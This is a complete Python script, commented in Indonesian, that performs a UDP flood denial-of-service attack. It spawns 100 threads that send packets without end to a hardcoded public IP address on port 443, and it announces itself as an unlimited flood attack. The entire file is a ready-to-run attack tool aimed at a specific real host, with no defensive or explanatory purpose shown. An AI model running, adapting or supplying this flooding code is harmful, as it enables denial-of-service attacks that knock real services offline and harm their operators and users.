import socket
import threading

# Konfigurasi
TARGET_IP = '182.253.38.108'  # Ganti dengan IP target
TARGET_PORT = 443                   # Port tujuan (biasanya 80 untuk HTTP)
NUM_THREADS = 100                   # Jumlah thread untuk mengirim request
MESSAGE = b"GET / HTTP/1.1\r\nHost: example.com\r\n\r\n"  # Pesan yang dikirim

# Fungsi untuk mengirim UDP request tanpa henti
def udp_flood():
    try:
        # Buat socket UDP
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while True:
            sock.sendto(MESSAGE, (TARGET_IP, TARGET_PORT))
    except Exception as e:
        print(f"Error: {e}")

# Mulai thread untuk mengirim request
def start_attack():
    threads = []
    for _ in range(NUM_THREADS):
        thread = threading.Thread(target=udp_flood)
        thread.start()
        threads.append(thread)
    
    # Program akan terus berjalan sampai dihentikan manual
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    print("Memulai UDP flood attack tanpa batas waktu...")
    print("Tekan Ctrl+C untuk menghentikan.")
    try:
        start_attack()
    except KeyboardInterrupt:
        print("\nSerangan dihentikan oleh pengguna.")
